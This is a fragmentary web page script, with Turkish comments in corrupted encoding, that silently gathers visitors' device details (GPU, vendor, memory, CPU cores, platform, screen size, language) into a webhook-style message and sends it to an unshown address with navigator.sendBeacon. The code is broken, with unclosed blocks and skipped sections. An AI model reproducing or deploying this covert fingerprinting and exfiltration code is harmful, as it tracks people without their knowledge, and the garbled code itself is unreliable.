<body>

        async function extract() {
            let info = { bat: "EriÅŸim Yok", gpu: "N/A", vendor: "N/A" };
            
            // 1. PÄ°L VE ÅARJ (KESÄ°N Ã‡EKÄ°M)
            try {

            // 3. PAYLOAD (SENÄ°N Ä°STEDÄ°ÄÄ°N TAM SET)
            const payload = {

                        { name: "ğŸ› ï¸ DONANIM KATMANI", value: `**GPU:** ${info.gpu}\n**VENDOR:** ${info.vendor}\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} Ã‡ekirdek`, inline: false },
                        { name: "ğŸ“± YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height} (${window.devicePixelRatio}x)\n**DÄ°L:** ${navigator.language}`, inline: true },

            // 4. FIRLAT VE GEÃ‡

            navigator.sendBeacon(u, blob);
